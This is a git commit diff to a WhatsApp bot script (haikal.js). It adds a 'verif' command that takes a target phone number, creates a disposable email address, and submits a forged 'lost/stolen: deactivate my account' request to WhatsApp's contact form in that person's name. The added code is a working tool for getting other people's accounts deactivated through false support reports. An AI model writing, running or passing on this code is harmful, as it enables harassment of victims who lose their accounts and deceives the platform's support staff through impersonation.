4ebac2c29b4e5830501b3ca343bb3f490c5412d0
Haikwlgaeu <118349257+Haikwlgaeu@users.noreply.github.com>
2022-11-30 13:03:21 +0700

    Add files via upload

--- haikal.js
+++ haikal.js
@@ -410,6 +410,44 @@ haikal.relayMessage(m.chat, document.message, { messageId: document.key.id })
 }
 }
 break
+case prefix+"verif": {
+  var axioss = require ("axios")
+  let ntah = await axioss.get("https://www.whatsapp.com/contact/noclient/")
+let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
+let cookie = ntah.headers["set-cookie"].join("; ")
+let $ = cheerio.load(ntah.data)
+let $form = $("form");
+let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
+let form = new URLSearchParams()
+form.append("jazoest", $form.find("input[name=jazoest]").val())
+form.append("lsd", $form.find("input[name=lsd]").val())
+form.append("step", "submit")
+form.append("country_selector", "ID")
+form.append("phone_number", q)
+form.append("email", email.data[0])
+form.append("email_confirm", email.data[0])
+form.append("platform", "ANDROID")
+form.append("your_message", "Perdido/roubado: desative minha conta")
+form.append("__user", "0")
+form.append("__a", "1")
+form.append("__csr", "")
+form.append("__req", "8")
+form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
+form.append("dpr", "1")
+form.append("__ccg", "UNKNOWN")
+form.append("__rev", "1006630858")
+form.append("__comment_req", "0")
+let res = await axioss({
+  url,
+  method: "POST",
+  data: form,
+  headers: {
+    cookie
+  }
+})
+haikal.sendMessage(m.chat, { text: util.format(res.data)}, { quoted: m })
+}
+break
 //=================================================//
 case 'jadidarknes': {
 if (isBan) throw sticBanLu(from)
